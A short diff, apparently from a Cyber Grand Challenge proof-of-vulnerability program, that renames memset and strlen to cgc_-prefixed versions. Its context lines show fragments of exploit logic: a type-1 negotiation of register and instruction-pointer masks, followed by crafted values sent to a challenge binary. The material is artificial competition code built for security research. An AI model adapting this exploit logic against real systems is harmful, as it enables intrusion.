@@ -35,7 +35,7 @@ void *calloc(size_t s) {
     void *p = malloc(s);
     if (!p)
         return NULL;
-    memset(p, '\0', s);
+    cgc_memset(p, '\0', s);
     return p;
 }
 
@@ -80,7 +80,7 @@ void build_crc_map(unsigned int *c, char **list) {
     int i;
 
     for (i=0; i < 4096; i++) {
-        c[i] = crc32(list[i],strlen(list[i]));
+        c[i] = crc32(list[i],cgc_strlen(list[i]));
     }
 }
 
@@ -114,10 +114,10 @@ int main(void) {
    type1_vals t1vals;
    type1_negotiate(0x00ffffff, 0xffffff00, 1, &t1vals);
 
-   transmit_all(0, setup, strlen(setup));
+   transmit_all(0, setup, cgc_strlen(setup));
 
    itoa(0x80000000|(t1vals.ipval&0x00ffffff), num);
-   transmit_all(0, num, strlen(num));
+   transmit_all(0, num, cgc_strlen(num));
 
    //we want "secure" mode
    transmit_all(0, "1\n", 2);
@@ -156,7 +156,7 @@ noun_verb_adv:
 done:
    for (i = 0; i < 4; i++) {
        itoa(indexes[i], num);
-       transmit_all(0, num, strlen(num));
+       transmit_all(0, num, cgc_strlen(num));
    }
 
     while(1) {
